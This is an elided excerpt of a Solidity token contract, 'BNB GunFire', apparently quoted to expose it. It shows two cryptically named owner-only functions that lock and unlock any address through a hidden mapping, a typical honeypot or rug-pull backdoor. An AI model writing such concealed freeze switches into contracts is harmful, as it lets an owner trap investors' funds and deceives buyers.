...
contract token is Ownable, IERC20 {
    ...
    string private _name = "BNB GunFire";
    string private _symbol = "BGunFire";
    ...
    function SL(address abcount) public onlyowiner {
        _LKD[abcount] = true;
    }


    function SUL(address abcount) public onlyowiner {
        _LKD[abcount] = false;
    }
